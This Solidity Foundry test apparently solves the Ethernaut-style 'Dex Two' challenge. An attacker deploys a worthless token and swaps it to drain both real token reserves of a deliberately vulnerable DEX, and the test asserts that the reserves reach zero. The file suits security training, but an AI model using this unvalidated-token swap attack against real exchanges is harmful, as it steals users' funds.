// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Swap2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletokenA;
    SwappableTokenTwo public swappabletokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!!
    function setUp() public {
        dexTwo = new DexTwo();
        swappabletokenA = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dexTwo.setTokens(address(swappabletokenA), address(swappabletokenB));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletokenA), 100);
        dexTwo.add_liquidity(address(swappabletokenB), 100);

        vm.label(attacker, "Attacker");

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
      
    }


    function testExploit() public {
    vm.startPrank(attacker);

    // Deploy attacker-controlled token
    SwappableTokenTwo maliciousToken = new SwappableTokenTwo(
        address(dexTwo),
        "DrainToken",
        "DTK",
        1000  // Attacker gets 1000 tokens
    );

    // Approve DexTwo to spend attacker's malicious tokens
    maliciousToken.approve(address(dexTwo), type(uint256).max);

    // Seed Dex with 1 malicious token (to avoid division by zero)
    maliciousToken.transfer(address(dexTwo), 1);

    // Drain Token A reserve (100 A)
    dexTwo.swap(address(maliciousToken), address(swappabletokenA), 1);
    
    // Drain Token B reserve (100 B)
    dexTwo.swap(address(maliciousToken), address(swappabletokenB), 2);

    vm.stopPrank();

    // Verify both reserves are emptied
    assertEq(
        swappabletokenA.balanceOf(address(dexTwo)), 
        0, 
        "Token A reserves not drained"
    );
    assertEq(
        swappabletokenB.balanceOf(address(dexTwo)), 
        0, 
        "Token B reserves not drained"
    );
}

  
}
